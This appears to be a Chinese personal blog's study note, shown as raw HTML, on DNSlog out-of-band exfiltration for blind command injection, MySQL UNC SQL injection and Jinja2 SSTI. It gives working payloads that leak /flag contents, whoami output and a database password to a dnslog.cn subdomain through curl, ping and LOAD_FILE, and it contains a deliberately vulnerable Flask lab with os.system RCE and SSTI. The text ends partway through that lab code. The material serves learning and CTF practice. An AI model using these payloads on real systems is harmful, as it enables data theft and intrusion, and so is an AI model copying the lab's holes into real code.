@@ -1,0 +1,802 @@
+  <!DOCTYPE html>
+  <html lang="en"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  <title>
+    DNSlog注入以及内存马注入喵 | Dawn
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish%3A400%2C400italic%2C700%2C700italic%7CNoto+Serif+SC%3A400%2C400italic%2C700%2C700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish%3A400%2C400italic%2C700%2C700italic%7CNoto+Serif+SC%3A400%2C400italic%2C700%2C700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="DNSlog注入以及内存马注入[TOC] 啊……这部分作为SSTI的一个补充喵 先来看一下DNSlog注入 DNSlog注入DNDlog注入，又称为带外攻击（OOB，Out-of-Band），专门用来应付无回显的一种技术 核心原理在理解DNSlog之前，先来了解一下：当我们在浏览器输入一个域名时，网络上到底发生了什么 假设我们输入gloria.com 我的电脑💻不知道这台服务器的ip，所以向DN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DNSlog注入以及内存马注入喵">
+<meta property="og:url" content="http://example.com/2026/06/18/DNSlog%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Dawn">
+<meta property="og:description" content="DNSlog注入以及内存马注入[TOC] 啊……这部分作为SSTI的一个补充喵 先来看一下DNSlog注入 DNSlog注入DNDlog注入，又称为带外攻击（OOB，Out-of-Band），专门用来应付无回显的一种技术 核心原理在理解DNSlog之前，先来了解一下：当我们在浏览器输入一个域名时，网络上到底发生了什么 假设我们输入gloria.com 我的电脑💻不知道这台服务器的ip，所以向DN">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2026/06/18/DNSlog%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/2.png">
+<meta property="og:image" content="http://example.com/2026/06/18/DNSlog%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/1.png">
+<meta property="og:image" content="http://example.com/2026/06/18/DNSlog%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/7.png">
+<meta property="og:image" content="http://example.com/2026/06/18/DNSlog%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/5.png">
+<meta property="og:image" content="http://example.com/2026/06/18/DNSlog%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/8.png">
+<meta property="og:image" content="http://example.com/2026/06/18/DNSlog%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/9.png">
+<meta property="article:published_time" content="2026-06-18T12:50:21.000Z">
+<meta property="article:modified_time" content="2026-06-22T14:09:11.990Z">
+<meta property="article:author" content="Gloria">
+<meta property="article:tag" content="DNSlog注入">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/06/18/DNSlog%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/2.png">
+    <link rel="alternate" href="/atom.xml" title="Dawn" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+          <div class="main-nav-icon icon rotate">
+              &#xe62b;
+          </div>
+          <span class="main-nav-link">Home</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/archives">
+          <div class="main-nav-icon icon rotate">
+              &#xe62b;
+          </div>
+          <span class="main-nav-link">Archives</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/about">
+          <div class="main-nav-icon icon rotate">
+              &#xe62b;
+          </div>
+          <span class="main-nav-link">About</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/friend">
+          <div class="main-nav-icon icon rotate">
+              &#xe62b;
+          </div>
+          <span class="main-nav-link">Friend</span>
+        </span>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" aria-label="RSS Feed" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+    <picture></picture>
+    <img  fetchpriority="high" src="/images/24.jpg" alt="DNSlog注入以及内存马注入喵">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">DNSlog注入以及内存马注入喵</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content" class="sidebar-left"  >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#DNSlog%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">DNSlog注入以及内存马注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DNSlog%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">DNSlog注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">核心原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%BE%E4%B8%AA%E6%A0%97%E5%AD%90"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">举个栗子 ~</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNSlog%E4%B8%89%E5%A4%A7%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.2.</span> <span class="toc-text">DNSlog三大姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-RCE%EF%BC%88Linux%E7%8E%AF%E5%A2%83%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">命令注入&#x2F;RCE（Linux环境）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E7%9B%B2%E6%B3%A8%EF%BC%88MySQL%E7%9A%84UNC%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E6%9C%BA%E5%88%B6%EF%BC%89"><span class="toc-number">1.2.2.</span> <span class="toc-text">SQL盲注（MySQL的UNC共享文件机制）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSTI%EF%BC%88Jinja2%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%9C%BA%E5%88%B6%EF%BC%89"><span class="toc-number">1.2.3.</span> <span class="toc-text">SSTI（Jinja2模板引擎的命令执行机制）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E6%B5%85%E5%86%99%E4%B8%AA%E5%B0%8F%E6%BC%8F%E6%B4%9E%E8%AF%95%E4%B8%80%E8%AF%95DNSlog%E7%9A%84%E5%8E%89%E5%AE%B3%E2%80%A6%E2%80%A6"><span class="toc-number">1.2.4.</span> <span class="toc-text">这里浅写个小漏洞试一试DNSlog的厉害……</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Gloria" class="lazyload">
+  <div class="sidebar-author-name">Gloria</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+</div>
+<div class="sidebar-social">
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-DNSlog注入以及内存马注入" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-06-18T12:50:21.000Z" itemprop="datePublished">2026-06-18</time>
+    <time style="display: none;" id="post-update-time">2026-06-22</time>
+  </span>
+</div>
+
+        <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="学习笔记">学习笔记</a>
+  </div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h2 id="DNSlog注入以及内存马注入"><a href="#DNSlog注入以及内存马注入" class="headerlink" title="DNSlog注入以及内存马注入"></a>DNSlog注入以及内存马注入</h2><p>[TOC]</p>
+<p>啊……这部分作为SSTI的一个补充喵</p>
+<p>先来看一下DNSlog注入</p>
+<h3 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h3><p>DNDlog注入，又称为带外攻击（OOB，Out-of-Band），专门用来应付无回显的一种技术</p>
+<h4 id="核心原理"><a href="#核心原理" class="headerlink" title="核心原理"></a>核心原理</h4><p>在理解DNSlog之前，先来了解一下：当我们在浏览器输入一个域名时，网络上到底发生了什么</p>
+<p>假设我们输入<code>gloria.com</code></p>
+<p>我的电脑💻不知道这台服务器的ip，所以向<strong>DNS服务器</strong>询问：<code>gloria.com</code>的ip是多少？</p>
+<p>如果这个域名有一台专门的权威DNS服务器，这个询问请求最终会流向这台服务器</p>
+<p>所以如果这台服务器是自己搭建的，那么只要有人尝试解析跟这个域名有关的任何子域名，都可以在**后台日志（log）**里看到</p>
+<h5 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子 ~"></a>举个栗子 ~</h5><p>假设我们有一个DNSlog平台，他分给我们一个专属域名：<code>gloria.dnslog.cn</code></p>
+<p>现在目标服务器上有个盲注漏洞（SQL注入、命令注入或者SSTI都可以），我们没有办法在网页上看到结果，但是我们可以让服务器执行一条命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping `<span class="built_in">cat</span> /flag`.gloria.dnslog.cn</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>反引号：当linux看到反引号的时候，会先执行里面的命令，假设<code>/flag</code>里面的内容是<code>flag&#123;xxxxx&#125;</code></p>
+</li>
+<li><p>拼接域名：命令被替换成了<code>ping flag&#123;xxxxx&#125;.gloria.dnslog.cn</code></p>
+</li>
+<li><p>发起请求：目标服务器回去公网解析这个域名</p>
+</li>
+<li><p>日志捕获：请求流到了你的DNSlog平台，在后台可以看到一条崭新的查询记录：<code>来源IP：xxx.xxx.xxx.xxx|想要解析：flag&#123;xxxxx&#125;.gloria.dnslog.cn</code></p>
+</li>
+</ul>
+<p>这样就<strong>带外</strong>出了flag</p>
+<h3 id="DNSlog三大姿势"><a href="#DNSlog三大姿势" class="headerlink" title="DNSlog三大姿势"></a>DNSlog三大姿势</h3><p>在不用漏洞里，调动DNS的命令是不一样的</p>
+<h4 id="命令注入-RCE（Linux环境）"><a href="#命令注入-RCE（Linux环境）" class="headerlink" title="命令注入&#x2F;RCE（Linux环境）"></a>命令注入&#x2F;RCE（Linux环境）</h4><p>在Linux下，最常用的是<code>curl</code>、<code>ping</code>、<code>host</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://`<span class="built_in">whoami</span>`.gloria.dnslog.cn</span><br><span class="line">ping -c 1 `<span class="built_in">cat</span> /flag`.gloria.dnslog.cn</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong>curl</strong>是一个网络抓取工具，当他尝试建立TCP连接去访问时，必须先知道对方IP，从而发起<code>getaddrinfo()</code>调用，触发系统发起DNS域名查询</p>
+</li>
+<li><p><strong>ping</strong>使用ICMP协议，也需要获取域名IP，所以也会强制系去解析域名</p>
+</li>
+</ul>
+<h4 id="SQL盲注（MySQL的UNC共享文件机制）"><a href="#SQL盲注（MySQL的UNC共享文件机制）" class="headerlink" title="SQL盲注（MySQL的UNC共享文件机制）"></a>SQL盲注（MySQL的UNC共享文件机制）</h4><p>经典payload（windows环境下地的MySQL为例）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>, (<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>), <span class="string">&#x27;.gloria.dnslog.cn\\abc&#x27;</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>LOAD_FILE()</code> :在MySQL中，<code>LOAD_FILE(file_name)</code>是一个内置函数，用于读取服务器本地的文件并将其作为字符串返回</li>
+<li>为什么没有外网访问权的数据库会向外发送DNS请求？（windows UNC路径机制）<ul>
+<li><strong>UNC路径</strong>是windows系统用来表示网络共享资源的格式，例如：<code>\\主机名\共享名\目录</code></li>
+<li>当我们向<code>LOAD_FILE</code>传入<code>\\\\password.gloria.dnslog.cn\\abc</code>时，MySQL引擎作为运行在windows上的程序，会试图去读取这个路径下的文件</li>
+<li>windows操作系统的<strong>底层网络重定向器</strong>（Network Redirector）看到后：这是一个网络共享文件，我必须先去连接这台主机</li>
+<li>然后windows系统就会<strong>自动向外发起DNS查询</strong>，询问password.gloria.dnslog.cn的IP</li>
+<li>结果数据库的密码被拼在主机名里面，被带外出来，在日志中可以查看到</li>
+</ul>
+</li>
+</ul>
+<p>🔺🔺🔺：存在环境局限，此姿势在<strong>windows上的数据库</strong>成功率极高，但是MySQL运行在linux上，由于<strong>linux默认不支持UNC路径</strong>，这种方式往往无法直接触发</p>
+<h4 id="SSTI（Jinja2模板引擎的命令执行机制）"><a href="#SSTI（Jinja2模板引擎的命令执行机制）" class="headerlink" title="SSTI（Jinja2模板引擎的命令执行机制）"></a>SSTI（Jinja2模板引擎的命令执行机制）</h4><p>经典payload：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;百分号 if lipsum.__globals__.os.popen(&#x27;curl http://`cat /flag`.gloria.dnslog.cn&#x27;).read() 百分号&#125;1&#123;百分号 endif 百分号&#125;</span><br></pre></td></tr></table></figure>
+
+<p>（这里因为<code>&#123;百分号</code>和hexo的模板引擎有点冲突就先用汉字代替罢…）</p>
+<p>无论哪种姿势，都需要注意的是DNS域名不支持特殊字符，所以要<strong>进行base64编码或者hex编码</strong>后再进行拼接</p>
+<p>例如</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 管道处理：读取 -&gt; 编码 -&gt; 去掉换行 -&gt; 去掉等号 -&gt; 发送</span></span><br><span class="line">curl http://$(<span class="built_in">cat</span> /flag | <span class="built_in">base64</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;=&#x27;</span>).abcde.dnslog.cn</span><br></pre></td></tr></table></figure>
+
+<h4 id="这里浅写个小漏洞试一试DNSlog的厉害……"><a href="#这里浅写个小漏洞试一试DNSlog的厉害……" class="headerlink" title="这里浅写个小漏洞试一试DNSlog的厉害……"></a>这里浅写个小漏洞试一试DNSlog的厉害……</h4><p>源码⬇</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">本地 DNSlog 注入测试靶场 (Flask 模拟环境)</span></span><br><span class="line"><span class="string">功能：提供无回显的命令注入 (RCE) 与模板注入 (SSTI) 漏洞，供安全研究与测试。</span></span><br><span class="line"><span class="string">运行方法：</span></span><br><span class="line"><span class="string">    1. 在 WSL/Ubuntu 中安装 Flask: pip3 install flask</span></span><br><span class="line"><span class="string">    2. 运行此脚本: python3 dnslog_lab_app.py</span></span><br><span class="line"><span class="string">    3. 访问 http://127.0.0.1:5000/</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># 基础说明页面</span></span><br><span class="line">    html = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;title&gt;DNSlog 注入本地测试靶场&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body style=&quot;font-family: sans-serif; margin: 40px; background: #f4f6f9;&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;🧪 Gloria 的 DNSlog 注入本地实验室 🧪&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;hr&gt;</span></span><br><span class="line"><span class="string">            &lt;div style=&quot;background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;h3&gt;🚨 漏洞点 1: 无回显命令注入 (RCE)&lt;/h3&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;请求路径: &lt;code&gt;/rce?cmd=[系统命令]&lt;/code&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;模拟场景: 页面永远只会返回 &quot;Command executed!&quot;，你无法在网页上看到任何命令输出。&lt;/p&gt;</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">                &lt;h3&gt;🚨 漏洞点 2: 无回显模板注入 (SSTI)&lt;/h3&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;请求路径: &lt;code&gt;/ssti?name=[Jinja2代码]&lt;/code&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;模拟场景: 页面只会返回 &quot;Hello, Guest!&quot;，你无法通过 &lt;code&gt;&#123;&#123;7*7&#125;&#125;&lt;/code&gt; 在网页上看到 49。&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;p style=&quot;color: #666; margin-top: 20px;&quot;&gt;注意：请在合法的本地测试环境下使用。Flag 存放在本地系统环境或当前目录的 flag.txt 中。&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="comment"># 漏洞点 1：无回显的命令执行 (RCE)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/rce&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rce</span>():</span><br><span class="line">    cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> cmd:</span><br><span class="line">        <span class="comment"># 使用 os.system 执行命令。注意：os.system 不会返回执行结果的文本，只返回状态码。</span></span><br><span class="line">        <span class="comment"># 页面没有任何回显，这是典型的“盲注”场景</span></span><br><span class="line">        os.system(cmd)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;h3&gt;Command executed!&lt;/h3&gt;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;h3&gt;Please provide a &#x27;cmd&#x27; parameter.&lt;/h3&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 漏洞点 2：无回显的模板注入 (SSTI)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssti</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        <span class="comment"># 安全防御：简单模拟过滤了 &#123;&#123; 和 print</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;&#123;&#123;&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> <span class="string">&#x27;print&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&lt;h3&gt;WAF: Detected Forbidden Characters! :(&lt;/h3&gt;&quot;</span>, <span class="number">403</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 错误的字符串拼接渲染，导致 SSTI</span></span><br><span class="line">        <span class="comment"># 但我们不直接输出渲染结果，或者让结果不显示你的 Payload 结果</span></span><br><span class="line">        template = <span class="string">f&quot;&#123;&#123;% if <span class="subst">&#123;name&#125;</span> %&#125;&#125;&lt;!-- secret --&gt;&#123;&#123;% endif %&#125;&#125;Hello, Guest!&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            render_template_string(template)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;h3&gt;Hello, Guest!&lt;/h3&gt;&quot;</span></span><br><span 